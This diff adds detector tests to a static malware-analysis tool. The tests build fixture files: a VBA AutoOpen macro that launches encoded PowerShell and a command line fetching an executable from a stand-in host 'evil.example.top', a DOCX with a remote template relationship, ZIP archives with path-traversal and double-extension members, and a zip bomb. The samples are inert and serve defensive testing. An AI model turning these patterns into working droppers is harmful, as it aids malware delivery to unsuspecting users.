@@ -175,3 +175,66 @@ def test_ssdeep_matches_the_reference_and_is_fast_on_padding():
     started = time.monotonic()
     assert hashes(padded)["ssdeep"]
     assert time.monotonic() - started < 10  # ppdeep needed about 90 s here
+
+
+def _zip(members, comment=b""):
+    import io
+    import zipfile
+
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+        for name, data in members:
+            z.writestr(name, data)
+        z.comment = comment
+    return buf.getvalue()
+
+
+CONTENT_TYPES = (b'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
+                 b'<Default Extension="xml" ContentType="application/xml"/></Types>')
+
+
+def test_office_macro_indicators_from_vba_source():
+    from chimera_static.plugins.office import analyze_office
+
+    vba = (b'Attribute VB_Name = "ThisDocument"\r\nSub AutoOpen()\r\n'
+           b'  Set s = CreateObject("WScript.Shell")\r\n  s.Run "powershell -enc AAAA"\r\n'
+           b'  Shell "cmd /c http://evil.example.top/a.exe"\r\nEnd Sub\r\n')
+    info, findings = analyze_office(vba, "ole")
+    got = {f["id"]: f for f in findings}
+    assert info["macros"] and "AutoOpen" in info["autoexec"]
+    assert {"office_macros", "office_autoexec", "office_suspicious_vba"} <= set(got)
+    assert got["office_suspicious_vba"]["severity"] == "high"
+
+
+def test_ooxml_remote_template_and_clean_document(tmp_path):
+    rels = (b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+            b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
+            b'attachedTemplate" Target="http://evil.example.top/t.dotm" TargetMode="External"/></Relationships>')
+    docx = _zip([("[Content_Types].xml", CONTENT_TYPES), ("word/document.xml", b"<w:document/>"),
+                 ("word/_rels/settings.xml.rels", rels)])
+    r = analyze(str(write(tmp_path, "invoice.docx", docx)), timeout_s=60, ember=False)
+    assert r["type"]["format"] == "ooxml"
+    assert "office_remote_template" in ids(r) and r["ooxml"]["macros"] is False
+    clean = _zip([("[Content_Types].xml", CONTENT_TYPES), ("word/document.xml", b"<w:document/>")])
+    r = analyze(str(write(tmp_path, "notes.docx", clean)), timeout_s=60, ember=False)
+    assert not {i for i in ids(r) if i.startswith("office_")}
+    assert r["coverage"]["complete"] is True and r["coverage"]["type_plugin"] == "ooxml"
+
+
+def test_zip_listing_flags_risky_members_and_is_never_complete(tmp_path):
+    data = _zip([("docs/readme.txt", b"hello"), ("invoice.pdf.exe", b"MZ" + bytes(100)),
+                 ("run.vbs", b"WScript.Echo 1"), ("../evil.dll", b"MZ"), ("inner.zip", b"PK")])
+    r = analyze(str(write(tmp_path, "parcel.zip", data)), timeout_s=60, ember=False)
+    assert r["type"]["format"] == "zip"
+    assert {"zip_executable", "zip_script", "zip_double_extension", "zip_nested", "zip_path_traversal"} <= ids(r)
+    assert r["zip"]["members"] == 5 and len(r["zip"]["listed"]) == 5
+    assert r["coverage"]["complete"] is False and "archive-contents" in r["coverage"]["failed_stages"]
+    quiet = _zip([("a.txt", b"x"), ("b.txt", b"y")])
+    r = analyze(str(write(tmp_path, "texts.zip", quiet)), timeout_s=60, ember=False)
+    assert not {i for i in ids(r) if i.startswith("zip_")} and r["coverage"]["complete"] is False
+
+
+def test_zip_bomb_ratio_is_reported_without_decompressing(tmp_path):
+    data = _zip([("big.bin", bytes(80 * 1024 * 1024))])
+    r = analyze(str(write(tmp_path, "bomb.zip", data)), timeout_s=60, ember=False)
+    assert "zip_bomb" in ids(r) and r["zip"]["compression_ratio"] > 100
